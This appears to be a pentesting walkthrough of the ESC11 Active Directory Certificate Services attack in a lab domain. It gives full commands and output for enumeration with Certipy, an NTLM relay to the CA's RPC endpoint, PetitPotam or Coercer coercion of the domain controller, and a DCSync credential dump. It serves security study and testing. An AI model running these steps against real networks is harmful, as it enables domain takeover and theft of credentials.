`ESC11` domain escalation is similar to `ESC8`; instead of requesting certificates via the `HTTP` web enrollment endpoints, `RPC`/`ICRP` enrollment endpoints are utilized.
In short terms this attack targets the RPC interface called `MS-ICPR` specifically the flag named  **IF_ENFORCEENCRYPTICERTREQUEST** which determines whether the signature check is enabled.


## Requisites
As briefly named in the introduction if the CA administrator edited the default configuration by unsetting the flag **IF_ENFORCEENCRYPTICERTREQUEST** then all the *enrolled certificate requests* will be **unencrypted**(between client and CA) allowing us to proceed with the attack.
By default, this flag is configured to verify the signature. However, if an administrator has modified this setting due to authentication issues in the Active Directory (which may occur if older Windows Server versions like Windows Server 2012 or 2008 are present in the domain), it becomes possible to carry out an NTLM relay attack and request a certificate from an authorized certificate template.


## Enumeration
To identify potential Templates that can be used to carry an ESC11 type attack we can do:
**Linux:**
```
 certipy-ad find -u blwasp -p 'Password123!' -dc-ip 172.16.19.3 -vulnerable -stdout

Certificate Authorities
  0
    CA Name                             : lab-WS01-CA
    DNS Name                            : WS01.lab.local
    Certificate Subject                 : CN=lab-WS01-CA, DC=lab, DC=local
    Certificate Serial Number           : 238F549429FFF796430B5F486159490B
    Certificate Validity Start          : 2023-07-06 09:44:47+00:00
    Certificate Validity End            : 2122-07-06 09:54:47+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        ManageCertificates              : LAB.LOCAL\Administrators
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        ManageCa                        : LAB.LOCAL\Administrators
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Enroll                          : LAB.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
Certificate Templates                   : [!] Could not find any certificate templates
```
What we are looking for here is the ESC11 vulnerability error message telling us that we can proceede.


# Attacks
If we identified that the CA is vulnerable to attack type ESC11 then we can follow the following steps to a machine takeover.
<font color="#ff0000">Note: If we were not attacking a domain controller, we can make the same attack on any computer within the network, but we would have to use a template that can be used for authentication of computers.</font>
- We start by setting up a NTLM relay that targets the RPC interface on the *CA IP address*.
```
sudo certipy-ad relay -target "rpc://172.16.19.5" -ca "lab-WS01-CA" -template DomainController

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting rpc://172.16.19.5 (ESC11)
[*] Listening on 0.0.0.0:445
```
- Next, we can setup a coerce attack with **PetitPotam**(even Coercer would have worked as described in the ESC8 attack path), we must indicate our *listening IP* address and the *target IP* address with is initiating the coercion(aka DC)
```
python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' 172.16.19.19 172.16.19.3

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.19.3[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```
- After a while Certipy should fetch a valid pfx for the DC computer object as seen same on ESC8 with coercer.
```
sudo certipy-ad relay -target "rpc://172.16.19.5" -ca "lab-WS01-CA" -template DomainController

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting rpc://172.16.19.5 (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:172.16.19.5[135] to determine ICPR stringbinding
[*] Attacking user 'LAB-DC$@DC'
[*] Requesting certificate for user 'LAB-DC$' with template 'DomainController'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 13
[*] Got certificate with DNS Host Name 'lab-dc.lab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'lab-dc.pfx'
[*] Exiting...
```
- **EXTRA:** If we would have used *coercer* instead of *Petitpotam* then this was the command
```
coercer coerce -l 172.16.19.19 -t 172.16.19.3 -u blwasp -p 'Password123!' -d lab.local -v
```
- From here we can do the authentication as usual to get a valid TGT.
```
certipy-ad auth -pfx lab-dc.pfx
```
- With this ticket we can perform a *DCSync* attack and a DC takeover.
```
export KRB5CCNAME=lab-dc.ccache
impacket-secretsdump -k -no-pass lab-dc.lab.local
```


## Conops
`Authentication coercion` attacks initiate an operation that forces the client to authenticate against us even if they do not intend to initiate authentication. These attacks usually rely on insecure code in some protocols used by sensitive servers. As mentioned by [@podalirius_](https://twitter.com/podalirius_) "The root cause of this vulnerability/feature in each of these methods is that Windows machines automatically authenticate to other machines when trying to access UNC paths like `\\172.16.117.30\file.txt`."